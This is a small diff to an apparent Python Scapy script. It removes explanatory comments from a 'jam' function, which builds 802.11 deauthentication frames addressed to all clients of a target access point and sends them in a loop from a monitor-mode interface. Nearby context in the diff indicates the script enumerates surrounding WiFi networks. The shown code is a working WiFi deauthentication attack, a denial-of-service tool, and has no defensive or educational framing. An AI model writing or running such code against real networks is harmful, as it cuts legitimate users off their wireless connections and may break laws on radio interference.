@@ -31,10 +31,10 @@ for wi in all_wifi:
 print "#" * 70
 
 def jam(address):
- conf.iface = "mon1" # The interface that you want to send packets out of, needs to be set to monitor mode
- bssid = address    #"F0:84:C9:5F:37:EE" # The BSSID of the Wireless Access Point you want to target
+ conf.iface = "mon1"
+ bssid = address   
  client = "FF:FF:FF:FF:FF:FF" #
- count = 3 # The number of deauth packets you want to send (unlimted cause I used while loop)
+ count = 3 
  conf.verb = 0
  packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
  for n in range(int(count)):
